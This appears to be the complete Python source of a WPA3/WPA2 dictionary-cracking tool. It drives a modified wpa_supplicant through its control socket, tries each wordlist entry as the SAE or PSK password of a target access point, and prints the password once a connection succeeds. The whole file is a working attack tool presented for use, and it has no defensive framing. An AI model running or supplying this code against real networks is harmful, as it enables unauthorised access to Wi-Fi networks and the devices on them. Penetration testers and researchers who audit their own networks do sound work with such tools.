#!/usr/bin/env python3

import argparse
import os
import re
import signal
import socket
import stat
import subprocess
import sys
import time

assert sys.version_info >= (3,7)

def kill(sig, frame):
    try:
        wacker.kill()
        print(f'Stopped at password attempt: {word}')
    except:
        pass
    sys.exit(0)

signal.signal(signal.SIGINT, kill)

class Wacker(object):
    RETRY = 0
    SUCCESS = 1
    FAILURE = 2
    EXIT = 3

    def __init__(self, args):
        self.args = args
        
        self.tmp_dir  = f'/tmp/wef/wacker'
        self.wacker_dir = f'/root/.config/wef/wacker'

        self.server = f'{self.tmp_dir}/{args.interface}'
        self.conf = f'{self.server}.conf'
        self.wpa  = f'{self.wacker_dir}/wpa_supplicant_amd64'
        self.pid  = f'{self.server}.pid'
        self.me = f'{self.tmp_dir}/{args.interface}_client'
        self.key_mgmt = ('SAE', 'WPA-PSK')[args.brute_wpa2]

        self.sock = socket.socket(socket.AF_UNIX, socket.SOCK_DGRAM)

        self.cmd = f'{self.wpa} -P {self.pid} -B -i {self.args.interface} -c {self.conf}'
        self.cmd = self.cmd.split()

        wpa_conf = 'ctrl_interface={}\n\n{}network={{\n}}'.format(self.tmp_dir, ('sae_pwe=2\n\n', '')[args.brute_wpa2])

        self.total_count = int(subprocess.check_output(f'wc -l {args.wordlist}', shell=True).split()[0].decode('utf-8'))

        # Create supplicant directory and remove previous files
        os.system(f'mkdir {self.tmp_dir} 2>/dev/null')
        os.system(f'rm -f {self.tmp_dir}/{args.interface}*')

        # Write configuration file
        with open(self.conf, 'w') as f:
            f.write(wpa_conf)

        # Initial supplicant setup
        self.start_supplicant()
        self.create_uds_endpoints()
        self.one_time_setup()

        # Create rolling average for pwd/sec
        self.rolling = [0] * 150
        self.start_time = time.time()
        self.lapse = self.start_time
        print('Start time: {}'.format(time.strftime('%d %b %Y %H:%M:%S', time.localtime(self.start_time))))

    def create_uds_endpoints(self):
        try:
            os.unlink(self.me)
        except Exception:
            if os.path.exists(self.me):
                raise

        self.sock.bind(self.me)

        print(f'Connecting to {self.server}')
        try:
            self.sock.connect(self.server)
        except Exception:
            raise

    def start_supplicant(self):
        print('Starting wpa_supplicant...')
        proc = subprocess.Popen(self.cmd)
        time.sleep(2)

        mode = os.stat(self.server).st_mode
        if not stat.S_ISSOCK(mode):
            raise Exception(f'Missing {self.server}... Is wpa_supplicant running?')

    def send_to_server(self, msg):
        self.sock.sendall(msg.encode())
        d = self.sock.recv(1024).decode().rstrip('\n')
        if d == "FAIL":
            raise Exception(f'{msg} failed!')
        return d

    def one_time_setup(self):
        self.send_to_server('ATTACH')
        self.send_to_server(f'SET_NETWORK 0 ssid "{self.args.ssid}"')
        self.send_to_server(f'SET_NETWORK 0 key_mgmt {self.key_mgmt}')
        self.send_to_server(f'SET_NETWORK 0 bssid {self.args.bssid}')
        self.send_to_server(f'SET_NETWORK 0 scan_freq {self.args.freq}')
        self.send_to_server(f'SET_NETWORK 0 freq_list {self.args.freq}')
        self.send_to_server(f'SET_NETWORK 0 ieee80211w 1')
        self.send_to_server(f'DISABLE_NETWORK 0')

    def send_connection_attempt(self, psk):
        print(f'Trying key: {psk}')

        if self.key_mgmt == 'SAE':
            self.send_to_server(f'SET_NETWORK 0 sae_password "{psk}"')
        else:
            self.send_to_server(f'SET_NETWORK 0 psk "{psk}"')

        self.send_to_server(f'ENABLE_NETWORK 0')

    def listen(self, count):
        while True:
            datagram = self.sock.recv(2048)
            if not datagram:
                return Wacker.RETRY

            data = datagram.decode().rstrip('\n')
            event = data.split()[0]
            if event == "<3>CTRL-EVENT-BRUTE-FAILURE":
                self.print_stats(count)
                self.send_to_server(f'DISABLE_NETWORK 0')
                print('\nBRUTE ATTEMPT FAIL\n')
                return Wacker.FAILURE
            elif event == "<3>CTRL-EVENT-NETWORK-NOT-FOUND":
                self.send_to_server(f'DISABLE_NETWORK 0')
                print(f'NETWORK NOT FOUND\n')
                return Wacker.EXIT
            elif event == "<3>CTRL-EVENT-SCAN-FAILED":
                self.send_to_server(f'DISABLE_NETWORK 0')
                print('SCAN FAILURE\n')
                return Wacker.EXIT
            elif event == "<3>CTRL-EVENT-BRUTE-SUCCESS":
                self.print_stats(count)
                print('\nBRUTE ATTEMPT SUCCESS\n')
                return Wacker.SUCCESS
            elif event == "<3>CTRL-EVENT-BRUTE-RETRY":
                print('\nBRUTE ATTEMPT RETRY\n')
                self.send_to_server(f'DISABLE_NETWORK 0')
                return Wacker.RETRY

    def print_stats(self, count):
        current = time.time()
        avg = 1 / (current - self.lapse)
        self.lapse = current

        if count <= 150:
            self.rolling[count-1] = avg
            avg = sum(self.rolling[:count]) / count
        else:
            self.rolling[(count-1) % 150] = avg
            avg = sum(self.rolling) / 150

        spot = count
        est = (self.total_count - spot) / avg
        percent = spot / self.total_count * 100
        end = time.strftime('%d %b %Y %H:%M:%S', time.localtime(current + est))
        lapse = current - self.start_time
        print(f'{spot:8} / {self.total_count:<8} words ({percent:2.2f}%) : {avg:4.0f} words/sec : ' \
              f'{lapse/3600:5.3f} hours lapsed : {est/3600:8.2f} hours to exhaust ({end})', end='\r')

    def kill(self):
        print('\nStop time: {}'.format(time.strftime('%d %b %Y %H:%M:%S', time.localtime(time.time()))))
        os.kill(int(open(self.pid).read()), signal.SIGKILL)

parser = argparse.ArgumentParser(description='A WPA3 dictionary cracker')
parser.add_argument('--wordlist', type=str, required=True, help='wordlist to use', dest='wordlist')
parser.add_argument('--interface', type=str, dest='interface', required=True, help='interface to use in managed mode')
parser.add_argument('--bssid', type=str, dest='bssid', required=True, help='bssid of the target AP')
parser.add_argument('--ssid', type=str, dest='ssid', required=True, help='the ssid of the WPA3 AP')
parser.add_argument('--freq', type=int, dest='freq', required=True, help='frequency of the AP')
parser.add_argument('--wpa2', dest='brute_wpa2', action='store_true', help='brute force wpa2-personal')

args = parser.parse_args()

if os.geteuid() != 0:
    print('This script must be run as root!')
    sys.exit(0)

wacker = Wacker(args)

def attempt(word, count):
    while True:
        wacker.send_connection_attempt(word)
        result = wacker.listen(count)
        if result == Wacker.EXIT:
            kill(None, None)
        elif result != Wacker.RETRY:
            return result

print()

# Start the cracking
count = 1
with open(args.wordlist, "r") as f:
    while True:
        word = f.readline()
        if word:
            word = word.rstrip('\n')
            result = attempt(word, count)
            
            if result == Wacker.SUCCESS:
                print(f'\nFound the password: "{word}"')
                break
        
            count += 1
        else:
            print('Could not find the password')
            break

wacker.kill()
